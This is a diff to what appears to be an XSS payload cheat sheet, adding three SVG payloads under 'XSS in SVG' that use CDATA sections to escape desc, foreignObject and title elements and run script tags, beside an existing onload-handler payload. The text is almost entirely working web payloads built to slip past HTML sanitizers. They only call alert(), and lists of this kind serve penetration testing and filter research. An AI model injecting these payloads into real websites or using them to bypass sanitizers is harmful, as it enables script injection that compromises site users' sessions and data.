@@ -178,6 +178,11 @@ XSS in SVG
 XSS in SVG (short)
 ```
 <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+
+
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
+<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
 ```
 
 XSS in SWF
